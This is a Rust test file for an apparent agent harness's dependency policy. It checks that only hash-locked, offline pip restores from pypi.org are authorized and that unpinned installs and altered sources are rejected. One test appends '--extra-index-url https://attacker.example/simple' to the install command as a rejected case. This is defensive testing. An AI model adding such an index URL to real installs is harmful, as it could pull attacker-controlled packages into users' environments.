use crate::harness::resource_bridge::dependency::{policy::decision_allowed, triage::triage};
use crate::harness::{
    DependencyDecision, DependencyKind, DependencyNeed, DependencyPackageIdentity,
    DependencyRequestStatus, PackageEcosystem,
};

fn pip_restore() -> DependencyNeed {
    DependencyNeed {
        ecosystem: PackageEcosystem::Pip,
        package: None,
        version: None,
        source: Some("https://pypi.org".into()),
        command: "python3 -m pip install --no-index --require-hashes --no-deps -r requirements.txt"
            .into(),
        reason: "Restore hash-pinned Python application dependencies".into(),
        kind: DependencyKind::ExistingRestore,
        lockfile_identity: Some(format!("sha256:{}", "a".repeat(64))),
        introduced_packages: vec![DependencyPackageIdentity {
            package: "sample-package".into(),
            version: "1.2.3".into(),
            source: "https://pypi.org".into(),
            integrity: format!("sha256:{}", "b".repeat(64)),
        }],
    }
}

#[test]
fn user_or_manager_can_authorize_only_hash_locked_pypi_existing_restores() {
    let need = pip_restore();
    assert!(decision_allowed(&need, DependencyDecision::AutoAuthorize));
    assert!(decision_allowed(
        &need,
        DependencyDecision::UserAuthorizeForTask
    ));

    let mut unsafe_need = need.clone();
    unsafe_need.source = Some("https://files.pythonhosted.org".into());
    assert!(!decision_allowed(
        &unsafe_need,
        DependencyDecision::UserAuthorizeForTask
    ));

    let mut unsafe_package = need.clone();
    unsafe_package.introduced_packages[0].source =
        "https://files.pythonhosted.org/packages/arbitrary.whl".into();
    assert!(!decision_allowed(
        &unsafe_package,
        DependencyDecision::AutoAuthorize
    ));

    let mut invalid_hash = need.clone();
    invalid_hash.introduced_packages[0].integrity = format!("sha1:{}", "b".repeat(64));
    assert!(!decision_allowed(
        &invalid_hash,
        DependencyDecision::AutoAuthorize
    ));

    let mut expanded_command = need.clone();
    expanded_command.command = format!(
        "{} --extra-index-url https://attacker.example/simple",
        need.command
    );
    assert!(!decision_allowed(
        &expanded_command,
        DependencyDecision::AutoAuthorize
    ));

    let mut new_dependency = need;
    new_dependency.kind = DependencyKind::NewProjectDependency;
    assert!(!decision_allowed(
        &new_dependency,
        DependencyDecision::AutoAuthorize
    ));
}

#[test]
fn triage_marks_exact_offline_restore_for_authorization_and_rejects_expansion() {
    let mut need = pip_restore();
    need.lockfile_identity = None;
    need.introduced_packages.clear();
    let request = triage(Some("task-1"), need);
    assert_eq!(
        request.decision,
        DependencyDecision::RequiresUserAuthorization
    );
    assert_eq!(
        request.category,
        crate::harness::DependencyFailureCategory::DependencyRestoreRequired
    );
    assert_eq!(request.status, DependencyRequestStatus::Pending);

    let mut unsafe_need = pip_restore();
    unsafe_need.lockfile_identity = None;
    unsafe_need.introduced_packages.clear();
    unsafe_need.command = "python3 -m pip install -r requirements.txt".into();
    let request = triage(Some("task-1"), unsafe_need);
    assert_ne!(
        request.category,
        crate::harness::DependencyFailureCategory::DependencyRestoreRequired
    );
}
